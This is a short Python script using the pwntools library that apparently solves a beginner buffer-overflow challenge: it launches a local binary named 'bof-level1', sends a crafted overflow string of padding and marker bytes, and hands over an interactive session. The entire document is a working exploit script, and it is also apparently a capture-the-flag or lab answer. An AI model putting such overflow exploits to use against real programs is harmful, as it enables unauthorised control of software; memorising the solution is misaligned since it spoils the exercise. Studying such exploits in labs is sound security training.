#!/usr/bin/env python

from pwn import *

p = process("./bof-level1")

p.recv()

p.send("30303030282828282020202018181818ABCDEFGHabcdefgh"+ "\n")

p.interactive()
